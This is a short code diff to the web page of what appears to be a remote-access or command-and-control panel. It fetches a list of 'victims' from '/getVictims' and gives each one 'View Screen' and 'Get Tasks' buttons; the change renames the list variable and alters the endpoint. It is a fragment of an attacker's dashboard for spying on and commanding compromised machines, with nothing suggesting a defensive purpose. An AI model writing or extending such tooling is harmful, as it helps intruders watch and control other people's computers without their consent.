@@ -36,15 +36,15 @@
 
     <script>
         async function fetchVictims() {
-            const response = await fetch('/');
+            const response = await fetch('/getVictims');
             const victims = await response.text();
             const victimList = document.getElementById('victimList');
-            victimList.innerHTML = victims.split('\n').map(victim => {
-                if (victim.trim() === '') return '';
+            victimList.innerHTML = victims.split('\n').map(uuid => {
+                if (uuid.trim() === '') return '';
                 return `<div class="victim">
-                    <span class="victim-id">${victim}</span>
-                    <button class="btn" onclick="viewScreen('${victim}')">View Screen</button>
-                    <button class="btn" onclick="getTasks('${victim}')">Get Tasks</button>
+                    <span class="victim-id">${uuid}</span>
+                    <button class="btn" onclick="viewScreen('${uuid}')">View Screen</button>
+                    <button class="btn" onclick="getTasks('${uuid}')">Get Tasks</button>
                 </div>`;
             }).join('');
         }
